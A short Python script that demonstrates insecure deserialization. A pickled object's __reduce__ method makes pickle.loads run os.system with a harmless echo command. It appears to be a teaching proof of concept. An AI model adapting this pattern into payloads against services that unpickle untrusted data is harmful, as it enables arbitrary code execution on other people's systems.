import pickle
import os

class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked"',))

vulnerable_data = pickle.dumps(VulnerableClass())

# Unpickling the data will execute the system command
pickle.loads(vulnerable_data)
